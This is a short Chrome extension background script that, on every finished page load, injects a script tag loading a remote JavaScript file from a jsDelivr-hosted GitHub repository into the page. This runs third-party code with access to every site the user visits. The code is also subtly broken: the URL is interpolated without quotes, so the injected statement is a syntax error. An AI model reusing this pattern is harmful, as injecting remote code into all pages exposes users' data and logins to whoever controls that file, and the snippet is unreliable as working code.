chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (changeInfo.status == 'complete') {
        const scriptz = "https://cdn.jsdelivr.net/gh/Ambushfall/ext-external-script/external.js"
      // Execute the script in the page
      chrome.tabs.executeScript(tabId, {
        code: `var script = document.createElement("script"); script.src = ${scriptz}; document.body.appendChild(script);`
      });
    }
  });
  